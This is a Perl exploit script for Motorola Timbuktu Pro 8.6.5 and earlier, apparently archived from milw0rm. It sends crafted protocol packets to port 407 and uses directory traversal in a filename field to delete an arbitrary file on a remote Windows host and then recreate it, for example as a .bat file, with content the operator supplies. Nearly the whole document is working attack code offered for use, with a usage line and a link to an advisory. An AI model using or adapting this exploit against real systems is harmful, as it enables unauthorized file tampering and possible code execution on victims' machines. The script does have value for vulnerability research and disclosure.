<html><head><title>Motorola Timbuktu Pro <= 8.6.5 File Deletion/Creation Exploit</title></head><pre>#!/usr/bin/perl
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
# Timbuktu Pro &lt;= 8.6.5 Arbitrary File Deletion/Creation
#
# Bug &amp; Exploit by titon [titon{at}bastardlabs{dot}com]
#
# Advisory: 
# http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=590
#
# Copyright: (c)2007 BastardLabs
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
#
# Usage: $ ./timbuktu_sploit.pl 192.168.0.69 407
#
#ooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOOooOO
use IO::Socket;
use Time::HiRes qw(usleep);
##
## we start in the C:\Program Files\Timbuktu Pro\N1\ folder
##
$filename = &amp;promptUser(&quot;Filename&quot; ,&quot;\\../../../pnw3d.bat&quot;);
##$filename = &amp;promptUser(&quot;Filename&quot; ,&quot;../../../pnw3d.bat&quot;);
$payload = &amp;promptUser(&quot;Payload &quot;,&quot;echo pwwwnnn333ddd !!&quot;);
##
##payload can be either text or binary (in \x42\x69\x42 format)
##
$payload =~ s/\\x(..)/pack(&quot;C&quot;,hex($1))/egi;
##
## packet1 == “hello” packet
##
$packet1= &quot;\x00\x01\x6b\x00\x00\xb0\x00\x23\x07\x22\x03\x07\xd6\x69\x6d\x3b&quot;.
&quot;\x27\xa8\xd0\xf2\xd6\x69\x6d\x3b\x27\xa8\xd0\xf2\x00\x09\x01\x41&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x01\x97\x01\x41\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\xb7\x1d&quot;.
&quot;\xbf\x42\x00\x00\x00\x00\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00&quot;;
$packet2= &quot;\xff&quot;;
##
## packet3 == packet containing the filename (with directory traversal)
##
$packet3= &quot;\xfb\x00\x00\x00\x00\x54\x45\x58\x54\x74\x74\x78\x74\xc2\x32\x94&quot;.
&quot;\xcc\xc2\x32\x94\xd9\x00\x00\x00\x00\x00\x00\x00\x13\x00\x00\x00&quot;.
&quot;\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
&quot;\x00\x00\x00\x00\x00\x00\x00&quot; . pack(&quot;C&quot;,length($filename)) . $filename ;
$packet4= &quot;\xf9\x00&quot;;
##
## packet5 == payload, the size of the payload is over 2 bytes
## so we have 65535 bytes of data to play with
##
$packet5= &quot;\xf8&quot; . pack(&quot;n&quot;,length($payload)) . $payload ;
$packet6= &quot;\xf7&quot;;
$packet7= &quot;\xfa&quot;;
$packet8= &quot;\xfe&quot;;
##
##DELETE THE FILE (IF NECESSARY)
##
print &quot;[+] Delete the file (if necessary)\n&quot;;
print &quot;[+] Connecting...\n&quot;;
$remote = &amp;connection(&quot;$ARGV[0]&quot;,&quot;$ARGV[1]&quot;);
print &quot;[+] Connected to $ARGV[0]:$ARGV[1]\n&quot;;
print $remote $packet1; print &quot;[+] Packet 1 Sent\n&quot;; usleep (80000);
print $remote $packet2; print &quot;[+] Packet 2 Sent\n&quot;; usleep (80000);
print $remote $packet3; print &quot;[+] Packet 3 Sent\n&quot;; usleep (80000);
##
## we break the connection before it's completed (i.e before the \xfe)
##
close $remote;
##
##(RE)CREATE THE FILE
##
print &quot;[+] (Re)Create the file with our content\n&quot;;
print &quot;[+] Connecting...\n&quot;;
$remote = &amp;connection(&quot;$ARGV[0]&quot;,&quot;$ARGV[1]&quot;);
print &quot;[+] Connected to $ARGV[0]:$ARGV[1]\n&quot;;
print $remote $packet1; print &quot;[+] Packet 1 Sent\n&quot;; usleep (80000);
print $remote $packet2; print &quot;[+] Packet 2 Sent\n&quot;; usleep (80000);
print $remote $packet3; print &quot;[+] Packet 3 Sent\n&quot;; usleep (80000);
print $remote $packet4; print &quot;[+] Packet 4 Sent\n&quot;; usleep (80000);
print $remote $packet5; print &quot;[+] Packet 5 Sent\n&quot;; usleep (80000);
print $remote $packet6; print &quot;[+] Packet 6 Sent\n&quot;; usleep (80000);
print $remote $packet7; print &quot;[+] Packet 7 Sent\n&quot;; usleep (80000);
print $remote $packet8; print &quot;[+] Packet 8 Sent\n&quot;; usleep (80000);
close $remote;
sub connection
{
local($dest,$port) = @_;
my $remote;
if (!$port or !dest) {
print &quot;\nUsage: $ ./timbuktu_sploit.pl 192.168.0.69 407\n\n&quot;; exit; }
else
{
$remote = IO::Socket::INET-&gt;new(
Proto =&gt; tcp,
PeerAddr =&gt; $dest,
PeerPort =&gt; $port,
Timeout =&gt; 1) or print &quot;[-] Error: Could not establish a
connection to $dest:$port\n&quot; and exit;
return $remote;
}
}
sub promptUser {
local($promptString,$defaultValue) = @_;
if ($defaultValue) {
print $promptString, &quot;[&quot;, $defaultValue, &quot;]: &quot;;
} else {
print $promptString, &quot;: &quot;;
}
$| = 1; # force a flush after our print
$_ = &lt;STDIN&gt;; # get the input from STDIN
chomp;
if (&quot;$defaultValue&quot;) {
return $_ ? $_ : $defaultValue; # return $_ if it has a value
} else {
return $_;
}
}

# milw0rm.com [2007-09-25]

# milw0rm.com [2008-03-11]</pre></html>